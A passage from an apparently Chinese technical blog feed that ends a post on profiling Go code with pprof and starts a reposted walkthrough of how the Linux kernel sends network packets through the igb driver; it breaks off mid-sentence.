class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">(pprof) top<br>Showing nodes accounting <span class="hljs-keyword">for</span> 350ms, 79.55% of 440ms total<br>Showing top 10 nodes out of 47<br>      flat  flat%   <span class="hljs-built_in">sum</span>%        cum   cum%<br>     110ms 25.00% 25.00%      110ms 25.00%  runtime.futex<br>      70ms 15.91% 40.91%       90ms 20.45%  github.com/marmotedu/iam/internal/apiserver/store/fake.(*policies).List<br>      40ms  9.09% 50.00%       40ms  9.09%  runtime.epollwait<br>      40ms  9.09% 59.09%      180ms 40.91%  runtime.findrunnable<br>      30ms  6.82% 65.91%       30ms  6.82%  runtime.write1<br>      20ms  4.55% 70.45%       30ms  6.82%  runtime.notesleep<br>      10ms  2.27% 72.73%      100ms 22.73%  github.com/marmotedu/iam/internal/apiserver/service/v1.(*userService).List<br>      10ms  2.27% 75.00%       10ms  2.27%  runtime.checkTimers<br>      10ms  2.27% 77.27%       10ms  2.27%  runtime.doaddtimer<br>      10ms  2.27% 79.55%       10ms  2.27%  runtime.mallocgc<br><br></code></pre></td></tr></table></figure><p>上面的输出中，每一行表示一个函数的信息。pprof程序中最重要的命令就是topN，这个命令用来显示profile文件中最靠前的N个样本（sample），top命令会输出多行信息，每一行代表一个函数的采样数据，默认按 <code>flat%</code> 排序。输出中，各列含义如下：</p><ul><li>flat：采样点落在该函数中的总时间。</li><li>flat%：采样点落在该函数中时间的百分比。</li><li>sum%：前面所有行的flat%的累加值，也就是上一项的累积百分比。</li><li>cum：采样点落在该函数中的，以及被它调用的函数中的总时间。</li><li>cum%：采样点落在该函数中的，以及被它调用的函数中的总次数百分比。</li><li>函数名。</li></ul><p>上面这些信息，可以告诉我们函数执行的时间和耗时排名，我们可以根据这些信息，来判断哪些函数可能有性能问题，或者哪些函数的性能可以进一步优化。</p><p>这里想提示下，如果执行的是 <code>go tool pprof mem.profile</code>，那么上面的各字段意义是类似的，只不过这次不是时间而是内存分配大小（字节）。</p><p>执行 <code>top</code> 命令默认是按 <code>flat%</code> 排序的，在做性能分析时，我们需要先按照 <code>cum</code> 来排序，通过 <code>cum</code>，我们可以直观地看到哪个函数总耗时最多，然后再参考该函数的本地采样时间和调用关系，来判断是该函数性能耗时多，还是它调用的函数耗时多。</p><p>执行 <code>top -cum</code> 输出如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">(pprof) top20 -cum<br>Showing nodes accounting <span class="hljs-keyword">for</span> 280ms, 63.64% of 440ms total<br>Showing top 20 nodes out of 47<br>      flat  flat%   <span class="hljs-built_in">sum</span>%        cum   cum%<br>         0     0%     0%      320ms 72.73%  runtime.mcall<br>         0     0%     0%      320ms 72.73%  runtime.park_m<br>         0     0%     0%      280ms 63.64%  runtime.schedule<br>      40ms  9.09%  9.09%      180ms 40.91%  runtime.findrunnable<br>     110ms 25.00% 34.09%      110ms 25.00%  runtime.futex<br>      10ms  2.27% 36.36%      100ms 22.73%  github.com/marmotedu/iam/internal/apiserver/service/v1.(*userService).List<br>         0     0% 36.36%      100ms 22.73%  github.com/marmotedu/iam/internal/apiserver/service/v1.BenchmarkListUser<br>         0     0% 36.36%      100ms 22.73%  runtime.futexwakeup<br>         0     0% 36.36%      100ms 22.73%  runtime.notewakeup<br>         0     0% 36.36%      100ms 22.73%  runtime.resetspinning<br>         0     0% 36.36%      100ms 22.73%  runtime.startm<br>         0     0% 36.36%      100ms 22.73%  runtime.wakep<br>         0     0% 36.36%      100ms 22.73%  testing.(*B).launch<br>         0     0% 36.36%      100ms 22.73%  testing.(*B).runN<br>      70ms 15.91% 52.27%       90ms 20.45%  github.com/marmotedu/iam/internal/apiserver/store/fake.(*policies).List<br>      10ms  2.27% 54.55%       50ms 11.36%  runtime.netpoll<br>      40ms  9.09% 63.64%       40ms  9.09%  runtime.epollwait<br>         0     0% 63.64%       40ms  9.09%  runtime.modtimer<br>         0     0% 63.64%       40ms  9.09%  runtime.resetForSleep<br>         0     0% 63.64%       40ms  9.09%  runtime.resettimer (inline)<br><br></code></pre></td></tr></table></figure><p>从上面的输出可知， <code>v1.BenchmarkListUser</code>、 <code>testing.(*B).launch</code>、 <code>testing.(*B).runN</code> 的本地采样时间占比分别为 <code>0%</code>、 <code>0%</code>、 <code>0%</code>，但是三者的累积采样时间占比却比较高，分别为 <code>22.73%</code>、 <code>22.73%</code>、 <code>22.73%</code>。</p><p>本地采样时间占比很小，但是累积采样时间占比很高，说明这3个函数耗时多是因为调用了其他函数，它们自身几乎没有耗时。根据采样图，我们可以看到函数的调用关系，具体如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/b0/4c/b0b7624a7922cea801de63b865f6ed4c.jpg?wh=1920x437" alt="img"></p><p>从采样图中，可以知道最终 <code>v1.BenchmarkListUser</code> 调用了 <code>v1.(*userService).List</code> 函数。 <code>v1.(*userService).List</code> 函数是我们编写的函数，该函数的本地采样时间占比为 <code>2.27%</code>，但是累积采样时间占比却高达 <code>22.73%</code>，说明 <code>v1.(*userService).List</code> 调用其他函数耗用了大量的CPU时间。</p><p>再观察采样图，可以看出 <code>v1.(*userService).List</code> 耗时久是因为调用了 <code>fake.(*policies).List</code> 函数。我们也可以通过 <code>list</code> 命令查看函数内部的耗时情况：</p><p><img src="https://static001.geekbang.org/resource/image/81/23/81765c7e56cb45d03a0a61de5835d823.png?wh=1920x576" alt="img"></p><p><code>list userService.*List</code> 会列出 <code>userService</code> 结构体 <code>List</code> 方法内部代码的耗时情况，从上图也可以看到， <code>u.store.Policies().List</code> 耗时最多。 <code>fake.(*policies).List</code> 的本地采样时间占比为 <code>15.91%</code>，说明 <code>fake.(*policies).List</code> 函数本身可能存在瓶颈。走读 <code>fake.(*policies).List</code> 代码可知，该函数是查询数据库的函数，查询数据库会有延时。继续查看 <code>v1.(*userService).List</code> 代码，我们可以发现以下调用逻辑：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u *userService)</span></span> ListWithBadPerformance(ctx context.Context, opts metav1.ListOptions) (*v1.UserList, <span class="hljs-type">error</span>) &#123;<br>    ...<br>    <span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> users.Items &#123;<br>        policies, err := u.store.Policies().List(ctx, user.Name, metav1.ListOptions&#123;&#125;)<br>        ...<br>        &#125;)<br>    &#125;<br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们在 <code>for</code> 循环中，串行调用了 <code>fake.(*policies).List</code> 函数，每一次循环都会调用有延时的 <code>fake.(*policies).List</code> 函数。多次调用， <code>v1.(*userService).List</code> 函数的耗时自然会累加起来。</p><p>现在问题找到了，那我们怎么优化呢？你可以利用CPU多核特性，开启多个goroutine，这样我们的查询耗时就不是串行累加的，而是取决于最慢一次的 <code>fake.(*policies).List</code> 调用。优化后的 <code>v1.(*userService).List</code> 函数代码见 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/apiserver/service/v1/user.go#L43-L110">internal&#x2F;apiserver&#x2F;service&#x2F;v1&#x2F;user.go</a>。用同样的性能测试用例，测试优化后的函数，结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -benchtime=30s -benchmem -bench=<span class="hljs-string">&quot;.*&quot;</span> -cpuprofile cpu.profile -memprofile mem.profile<br>goos: linux<br>goarch: amd64<br>pkg: github.com/marmotedu/iam/internal/apiserver/service/v1<br>cpu: AMD EPYC Processor<br>BenchmarkListUser-8       8330   4271131 ns/op   26390 B/op     484 allocs/op<br>PASS<br>ok  github.com/marmotedu/iam/internal/apiserver/service/v136.179s<br><br></code></pre></td></tr></table></figure><p>上面的代码中，ns&#x2F;op为 <code>4271131 ns/op</code>，可以看到和第一次的测试结果 <code>204523677 ns/op</code> 相比，性能提升了 <code>97.91%</code>。</p><p>这里注意下，为了方便你对照，我将优化前的 <code>v1.(*userService).List</code> 函数重命名为 <code>v1.(*userService).ListWithBadPerformance</code>。</p><h3 id="内存性能分析"><a href="#内存性能分析" class="headerlink" title="内存性能分析"></a>内存性能分析</h3><p>Go语言运行时，系统会对程序运行期间的所有堆内存分配进行记录。不管在采样的哪一时刻，也不管堆内存已用字节数是否有增长，只要有字节被分配且数量足够，分析器就会对它进行采样。</p><p>内存性能分析方法和CPU性能分析方法比较类似，可以借助前面生成的内存性能数据文件 <code>mem.profile</code> 自行分析。</p><p>接下来，展示下内存优化前和优化后的效果。在 <code>v1.(*userService).List</code> 函数（位于 <a href="https://github.com/marmotedu/iam/blob/v1.0.8/internal/apiserver/service/v1/user.go#L43-L110">internal&#x2F;apiserver&#x2F;service&#x2F;v1&#x2F;user.go</a> 文件中）中，有以下代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">infos := <span class="hljs-built_in">make</span>([]*v1.User, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> users.Items &#123;<br>    info, _ := m.Load(user.ID)<br>    infos = <span class="hljs-built_in">append</span>(infos, info.(*v1.User))<br>&#125;<br><br></code></pre></td></tr></table></figure><p>此时，我们运行 <code>go test</code> 命令，测试下内存性能，作为优化后的性能数据，进行对比：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -benchmem -bench=<span class="hljs-string">&quot;.*&quot;</span> -cpuprofile cpu.profile -memprofile mem.profile<br>goos: linux<br>goarch: amd64<br>pkg: github.com/marmotedu/iam/internal/apiserver/service/v1<br>cpu: AMD EPYC Processor<br>BenchmarkListUser-8        278   4284660 ns/op   27101 B/op     491 allocs/op<br>PASS<br>ok  github.com/marmotedu/iam/internal/apiserver/service/v11.779s<br><br></code></pre></td></tr></table></figure><p><code>B/op</code> 和 <code>allocs/op</code> 分别为 <code>27101 B/op</code> 和 <code>491 allocs/op</code>。</p><p>我们通过分析代码，发现可以将 <code>infos := make([]*v1.User, 0)</code> 优化为 <code>infos := make([]*v1.User, 0, len(users.Items))</code>，来减少Go切片的内存重新分配的次数。优化后的代码为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//infos := make([]*v1.User, 0)</span><br>infos := <span class="hljs-built_in">make</span>([]*v1.User, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(users.Items))<br><span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> users.Items &#123;<br>    info, _ := m.Load(user.ID)<br>    infos = <span class="hljs-built_in">append</span>(infos, info.(*v1.User))<br>&#125;<br><br></code></pre></td></tr></table></figure><p>再执行 <code>go test</code> 测试下性能：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -benchmem -bench=<span class="hljs-string">&quot;.*&quot;</span> -cpuprofile cpu.profile -memprofile mem.profile<br>goos: linux<br>goarch: amd64<br>pkg: github.com/marmotedu/iam/internal/apiserver/service/v1<br>cpu: AMD EPYC Processor<br>BenchmarkListUser-8        276   4318472 ns/op   26457 B/op     484 allocs/op<br>PASS<br>ok  github.com/marmotedu/iam/internal/apiserver/service/v11.856s<br><br></code></pre></td></tr></table></figure><p>优化后的 <code>B/op</code> 和 <code>allocs/op</code> 分别为 <code>26457 B/op</code> 和 <code>484 allocs/op</code>。跟第一次的 <code>27101 B/op</code> 和 <code>491 allocs/op</code> 相比，内存分配次数更少，每次分配的内存也更少。</p><p>我们可以执行 <code>go tool pprof</code> 命令，来查看CPU的性能数据文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go tool pprof v1.test mem.profile<br>File: v1.test<br>Type: alloc_space<br>Time: Aug 17, 2021 at 8:33pm (CST)<br>Entering interactive mode (<span class="hljs-built_in">type</span> <span class="hljs-string">&quot;help&quot;</span> <span class="hljs-keyword">for</span> commands, <span class="hljs-string">&quot;o&quot;</span> <span class="hljs-keyword">for</span> options)<br>(pprof)<br><br></code></pre></td></tr></table></figure><p>该命令会进入一个交互界面，在交互界面中执行top命令，可以查看性能样本数据，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">(pprof) top<br>Showing nodes accounting <span class="hljs-keyword">for</span> 10347.32kB, 95.28% of 10859.34kB total<br>Showing top 10 nodes out of 52<br>      flat  flat%   <span class="hljs-built_in">sum</span>%        cum   cum%<br> 3072.56kB 28.29% 28.29%  4096.64kB 37.72%  github.com/marmotedu/iam/internal/apiserver/service/v1.(*userService).List.func1<br> 1762.94kB 16.23% 44.53%  1762.94kB 16.23%  runtime/pprof.StartCPUProfile<br> 1024.52kB  9.43% 53.96%  1024.52kB  9.43%  go.uber.org/zap/buffer.NewPool.func1<br> 1024.08kB  9.43% 63.39%  1024.08kB  9.43%  time.Sleep<br>  902.59kB  8.31% 71.70%   902.59kB  8.31%  compress/flate.NewWriter<br>  512.20kB  4.72% 76.42%  1536.72kB 14.15%  github.com/marmotedu/iam/internal/apiserver/service/v1.(*userService).List<br>  512.19kB  4.72% 81.14%   512.19kB  4.72%  runtime.malg<br>  512.12kB  4.72% 85.85%   512.12kB  4.72%  regexp.makeOnePass<br>  512.09kB  4.72% 90.57%   512.09kB  4.72%  github.com/marmotedu/iam/internal/apiserver/store/fake.FakeUsers<br>  512.04kB  4.72% 95.28%   512.04kB  4.72%  runtime/pprof.allFrames<br><br></code></pre></td></tr></table></figure><p>上面的内存性能数据，各字段的含义依次是：</p><ul><li>flat，采样点落在该函数中的总内存消耗。</li><li>flat% ，采样点落在该函数中的百分比。</li><li>sum% ，上一项的累积百分比。</li><li>cum ，采样点落在该函数，以及被它调用的函数中的总内存消耗。</li><li>cum%，采样点落在该函数，以及被它调用的函数中的总次数百分比。</li><li>函数名。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在Go项目开发中，程序性能低下时，我们需要分析出问题所在的代码。Go语言提供的 <code>go tool pprof</code> 工具可以支持我们分析代码的性能。我们可以通过两步来分析代码的性能，分别是生成性能数据文件和分析性能数据文件。</p><p>Go中可以用来生成性能数据文件的方式有三种：通过命令行生成性能数据文件、通过代码生成性能数据文件、通过 <code>net/http/pprof</code> 生成性能数据文件。</p><p>生成性能数据文件之后，就可以使用 <code>go tool pprof</code> 工具来分析性能数据文件了。我们可以分别获取到CPU和内存的性能数据，通过分析就可以找到性能瓶颈。有3种分析性能数据文件的方式，分别是分析采样图、分析火焰图和用 <code>go tool pprof</code> 交互模式查看详细数据。因为火焰图直观高效，所以我建议你多使用火焰图来分析性能。</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p>1.孔令飞，<a href="https://time.geekbang.org/column/article/410205">Go 语言项目开发实战</a></p><p>2.郝林，<a href="https://time.geekbang.org/column/article/69812">Go 语言核心 36 讲</a></p>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux 网络包发送过程</title>
    <link href="/2022/11/25/Linux%20%E7%BD%91%E7%BB%9C%E5%8C%85%E5%8F%91%E9%80%81%E8%BF%87%E7%A8%8B/"/>
    <url>/2022/11/25/Linux%20%E7%BD%91%E7%BB%9C%E5%8C%85%E5%8F%91%E9%80%81%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">#                                   Linux 网络包发送过程<blockquote><p>转载自张彦飞大佬的<a href="https://zhuanlan.zhihu.com/p/373060740">图解 Linux 网络包发送过程</a></p></blockquote><p>如下代码是一个典型服务器程序的典型的缩微代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">int main()&#123;<br> fd = socket(AF_INET, SOCK_STREAM, 0);<br> bind(fd, ...);<br> listen(fd, ...);<br><br> cfd = accept(fd, ...);<br><br> // 接收用户请求<br> read(cfd, ...);<br><br> // 用户请求处理<br> dosometing(); <br><br> // 给用户返回结果<br> send(cfd, buf, sizeof(buf), 0);<br>&#125;<br></code></pre></td></tr></table></figure><p>今天我们来讨论上述代码中，调用 send 之后内核是怎么样把数据包发送出去的。本文基于Linux 3.10，网卡驱动采用Intel的igb网卡举例。</p><h2 id="一、Linux-网络发送过程总览"><a href="#一、Linux-网络发送过程总览" class="headerlink" title="一、Linux 网络发送过程总览"></a><strong>一、Linux 网络发送过程总览</strong></h2><p>看 Linux 源码最重要的是得有整体上的把握，而不是一开始就陷入各种细节。</p><p>这里先给大家准备了一个总的流程图，简单阐述下 send 发送了的数据是如何一步一步被发送到网卡的。</p><p><img src="https://pic1.zhimg.com/80/v2-18543fabe38c2eddcb2f0eba9e0e79f4_1440w.webp" alt="img"></p><p>在这幅图中，我们看到用户数据被拷贝到内核态，然后经过协议栈处理后进入到了 RingBuffer 中。随后网卡驱动真正将数据发送了出去。当发送完成的时候，是通过硬中断来通知 CPU，然后清理 RingBuffer。</p><p>因为文章后面要进入源码，所以我们再从源码的角度给出一个流程图。</p><p><img src="https://pic2.zhimg.com/80/v2-b511a062c2803ecfc6931bfdcf3f2b51_1440w.webp" alt="img"></p><p>虽然数据这时已经发送完毕，但是其实还有一件重要的事情没有做，那就是释放缓存队列等内存。</p><p>那内核是如何知道什么时候才能释放内存的呢，当然是等网络发送完毕之后。网卡在发送完毕的时候，会给 CPU 发送一个硬中断来通知 CPU。更完整的流程看图：</p><p><img src="https://pic3.zhimg.com/80/v2-4040c1e92f7b492c522848b786285e96_1440w.webp" alt="img"></p><p>注意，我们今天的主题虽然是发送数据，但是硬中断最终触发的软中断却是 NET_RX_SOFTIRQ，而并不是 NET_TX_SOFTIRQ ！！！（T 是 transmit 的缩写，R 表示 receive）</p><blockquote><p>问1：在服务器上查看 &#x2F;proc&#x2F;softirqs，为什么 NET_RX 要比 NET_TX 大的多的多？</p></blockquote><p>传输完成最终会触发 NET_RX，而不是 NET_TX。 所以自然你观测 &#x2F;proc&#x2F;softirqs 也就能看到 NET_RX 更多了。</p><p>好，现在已经对内核是怎么发送网络包的有一个全局上的把握了。不要得意，我们需要了解的细节才是更有价值的地方，让我们继续！！</p><h2 id="二、网卡启动准备"><a href="#二、网卡启动准备" class="headerlink" title="二、网卡启动准备"></a><strong>二、网卡启动准备</strong></h2><p>现在的服务器上的网卡一般都是支持多队列的。每一个队列上都是由一个 RingBuffer 表示的，开启了多队列以后的的网卡就会对应有多个 RingBuffer。</p><p><img src="https://pic4.zhimg.com/80/v2-ce24c3abe8e58f9fd4d269bd64291347_1440w.webp" alt="img"></p><p>网卡在启动时最重要的任务之一就是分配和初始化 RingBuffer，理解了 RingBuffer 将会非常有助于后面我们掌握发送。因为今天的主题是发送，所以就以传输队列为例，我们来看下网卡启动时分配 RingBuffer 的实际过程。</p><p>在网卡启动的时候，会调用到 __igb_open 函数，RingBuffer 就是在这里分配的。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: drivers/net/ethernet/intel/igb/igb_main.c<br>static int __igb_open(struct net_device *netdev, bool resuming)<br>&#123;<br> struct igb_adapter *adapter = netdev_priv(netdev);<br><br> //分配传输描述符数组<br> err = igb_setup_all_tx_resources(adapter);<br><br> //分配接收描述符数组<br> err = igb_setup_all_rx_resources(adapter);<br><br> //开启全部队列<br> netif_tx_start_all_queues(netdev);<br>&#125;<br></code></pre></td></tr></table></figure><p>在上面 __igb_open 函数调用 igb_setup_all_tx_resources 分配所有的传输 RingBuffer, 调用 igb_setup_all_rx_resources 创建所有的接收 RingBuffer。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: drivers/net/ethernet/intel/igb/igb_main.c<br>static int igb_setup_all_tx_resources(struct igb_adapter *adapter)<br>&#123;<br> //有几个队列就构造几个 RingBuffer<br> for (i = 0; i &lt; adapter-&gt;num_tx_queues; i++) &#123;<br>  igb_setup_tx_resources(adapter-&gt;tx_ring[i]);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>真正的 RingBuffer 构造过程是在 igb_setup_tx_resources 中完成的。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: drivers/net/ethernet/intel/igb/igb_main.c<br>int igb_setup_tx_resources(struct igb_ring *tx_ring)<br>&#123;<br> //1.申请 igb_tx_buffer 数组内存<br> size = sizeof(struct igb_tx_buffer) * tx_ring-&gt;count;<br> tx_ring-&gt;tx_buffer_info = vzalloc(size);<br><br> //2.申请 e1000_adv_tx_desc DMA 数组内存<br> tx_ring-&gt;size = tx_ring-&gt;count * sizeof(union e1000_adv_tx_desc);<br> tx_ring-&gt;size = ALIGN(tx_ring-&gt;size, 4096);<br> tx_ring-&gt;desc = dma_alloc_coherent(dev, tx_ring-&gt;size,<br>        &amp;tx_ring-&gt;dma, GFP_KERNEL);<br><br> //3.初始化队列成员<br> tx_ring-&gt;next_to_use = 0;<br> tx_ring-&gt;next_to_clean = 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>从上述源码可以看到，实际上一个 RingBuffer 的内部不仅仅是一个环形队列数组，而是有两个。</p><p>1）igb_tx_buffer 数组：这个数组是内核使用的，通过 vzalloc 申请的。<br>2）e1000_adv_tx_desc 数组：这个数组是网卡硬件使用的，硬件是可以通过 DMA 直接访问这块内存，通过 dma_alloc_coherent 分配。</p><p>这个时候它们之间还没有啥联系。将来在发送的时候，这两个环形数组中相同位置的指针将都将指向同一个 skb。这样，内核和硬件就能共同访问同样的数据了，内核往 skb 里写数据，网卡硬件负责发送。</p><p><img src="https://pic1.zhimg.com/80/v2-3385217f1469def5689fc0057739df64_1440w.webp" alt="img"></p><p>最后调用 netif_tx_start_all_queues 开启队列。另外，对于硬中断的处理函数 igb_msix_ring 其实也是在 __igb_open 中注册的。</p><h2 id="三、accept-创建新-socket"><a href="#三、accept-创建新-socket" class="headerlink" title="三、accept 创建新 socket"></a><strong>三、accept 创建新 socket</strong></h2><p>在发送数据之前，我们往往还需要一个已经建立好连接的 socket。</p><p>我们就以开篇服务器缩微源代码中提到的 accept 为例，当 accept 之后，进程会创建一个新的 socket 出来，然后把它放到当前进程的打开文件列表中，专门用于和对应的客户端通信。</p><p>假设服务器进程通过 accept 和客户端建立了两条连接，我们来简单看一下这两条连接和进程的关联关系。</p><p><img src="https://pic4.zhimg.com/80/v2-52d6007054ead81044fef43870b3cadb_1440w.webp" alt="img"></p><p>其中代表一条连接的 socket 内核对象更为具体一点的结构图如下。</p><p><img src="https://pic4.zhimg.com/80/v2-c2bdf3847e53d464b53478491968f6ff_1440w.webp" alt="img"></p><p>为了避免喧宾夺主，accept 详细的源码过程这里就不介绍了，感兴趣请参考 **<a href="https://link.zhihu.com/?target=https://mp.weixin.qq.com/s/OmRdUgO1guMX76EdZn11UQ">《图解 | 深入揭秘 epoll 是如何实现 IO 多路复用的！》</a>**。一文中的第一部分。</p><p>今天我们还是把重点放到数据发送过程上。</p><h2 id="四、发送数据真正开始"><a href="#四、发送数据真正开始" class="headerlink" title="四、发送数据真正开始"></a><strong>四、发送数据真正开始</strong></h2><h3 id="4-1-send-系统调用实现"><a href="#4-1-send-系统调用实现" class="headerlink" title="4.1 send 系统调用实现"></a><strong>4.1 send 系统调用实现</strong></h3><p>send 系统调用的源码位于文件 net&#x2F;socket.c 中。在这个系统调用里，内部其实真正使用的是 sendto 系统调用。整个调用链条虽然不短，但其实主要只干了两件简单的事情，</p><ul><li>第一是在内核中把真正的 socket 找出来，在这个对象里记录着各种协议栈的函数地址。</li><li>第二是构造一个 struct msghdr 对象，把用户传入的数据，比如 buffer地址、数据长度啥的，统统都装进去.</li></ul><p>剩下的事情就交给下一层，协议栈里的函数 inet_sendmsg 了，其中 inet_sendmsg 函数的地址是通过 socket 内核对象里的 ops 成员找到的。大致流程如图。</p><p><img src="https://pic4.zhimg.com/80/v2-33dbbf07ba4846e60c8edb671d00c07f_1440w.webp" alt="img"></p><p>有了上面的了解，我们再看起源码就要容易许多了。源码如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/socket.c<br>SYSCALL_DEFINE4(send, int, fd, void __user *, buff, size_t, len,<br>  unsigned int, flags)<br>&#123;<br> return sys_sendto(fd, buff, len, flags, NULL, 0);<br>&#125;<br><br>SYSCALL_DEFINE6(......)<br>&#123;<br> //1.根据 fd 查找到 socket<br> sock = sockfd_lookup_light(fd, &amp;err, &amp;fput_needed);<br><br> //2.构造 msghdr<br> struct msghdr msg;<br> struct iovec iov;<br><br> iov.iov_base = buff;<br> iov.iov_len = len;<br> msg.msg_iovlen = 1;<br><br> msg.msg_iov = &amp;iov;<br> msg.msg_flags = flags;<br> ......<br><br> //3.发送数据<br> sock_sendmsg(sock, &amp;msg, len);<br>&#125;<br></code></pre></td></tr></table></figure><p>从源码可以看到，我们在用户态使用的 send 函数和 sendto 函数其实都是 sendto 系统调用实现的。send 只是为了方便，封装出来的一个更易于调用的方式而已。</p><p>在 sendto 系统调用里，首先根据用户传进来的 socket 句柄号来查找真正的 socket 内核对象。接着把用户请求的 buff、len、flag 等参数都统统打包到一个 struct msghdr 对象中。</p><p>接着调用了 sock_sendmsg &#x3D;&gt; __sock_sendmsg &#x3D;&#x3D;&gt; __sock_sendmsg_nosec。在__sock_sendmsg_nosec 